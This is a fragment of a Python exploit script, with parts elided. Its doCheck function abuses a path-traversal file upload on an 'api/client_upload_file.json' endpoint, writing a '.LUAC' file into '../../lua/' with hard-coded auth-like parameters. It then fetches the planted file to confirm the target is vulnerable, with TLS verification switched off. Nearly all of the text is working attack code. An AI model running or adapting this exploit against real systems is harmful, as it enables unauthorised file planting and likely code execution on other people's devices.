...
def doCheck(url):
    if url[-1] != "/":
        url = url + "/"
    targetUrl = url + f'api/client_upload_file.json?mid=202cb962ac59075b964b07152d234b10&md5=88aca4dfc84d8abd8c2b01a572d60339&filename=../../lua/{r2}.LUAC'
    headers = {
...
------WebKitFormBoundaryLx7ATxHThfk91oxQ--'''
    req = requests.post(targetUrl, body, headers=headers, timeout=20, verify=False)
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"}
    res = requests.get(url + f'api/{r2}.json', headers=headers, timeout=20, verify=False)
    if res.status_code == 200 and '"status":true' in req.text:
        return targetUrl
    else:
        return False
